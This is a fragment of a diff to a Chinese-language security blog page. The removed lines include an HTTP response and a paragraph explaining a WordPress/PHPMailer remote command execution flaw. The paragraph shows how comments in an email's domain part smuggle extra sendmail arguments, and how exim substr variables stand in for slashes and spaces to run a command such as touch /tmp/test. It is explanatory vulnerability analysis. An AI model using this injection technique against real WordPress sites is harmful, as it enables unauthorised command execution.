-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Found</div><div class="line">Date: Thu, 04 May 2017 07:37:15 GMT</div><div class="line">Server: Apache/2.4.7 (Ubuntu)</div><div class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.21</div><div class="line">Expires: Wed, 11 Jan 1984 05:00:00 GMT</div><div class="line">Cache-Control: no-cache, must-revalidate, max-age=0</div><div class="line">Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/</div><div class="line">X-Frame-Options: SAMEORIGIN</div><div class="line">Location: wp-login.php?checkemail=confirm</div><div class="line">Content-Length: 0</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div></pre></td></tr></table></figure>
-<p>原作者主要是利用了Host中可以包含注释来夹带私货，来绕过域名中不能包含空格的问题（注释中域名部分可带空格来分割sendmail的参数），在WordPress中filter_var/FILTER_VALIDATE_EMAIL中和PHPMailer library库中validateAddress(）都是参考的<a href="https://www.ietf.org/rfc/rfc822.txt" target="_blank" rel="external">RFC 822</a>，实现都是一样的。一个简单的注释示例如<code>john@example.com(comment)</code>,而且域名部分可以包含空格。这就可以将参数传递到sendmail的第五个，第六个参数。为了绕过不能/的问题，作者尝试了perl，base64/hex，最终选定了substr来提取exim4自带的默认参数，<code>${substr{0}{1}{$spool_directory}</code> 来替代 用 <code>/</code>,${substr{10}{1}{$tod_log}} 来替代空格，这样就可以搞定一个命令执行。其实exim中涉及的变量还挺多，还有些是可以利用的。<code>/usr/bin/touch /tmp/test</code>,对于上面提供的poc得注意user_login必须是存在的，这个也在文章中设置wordpress的时候提到过，可以是用户名或者邮箱,提供的不对的话会报用户不存在的错误。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2256,7 +2278,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2278,7 +2300,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">105</span>
+                <span class="site-state-item-count">108</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
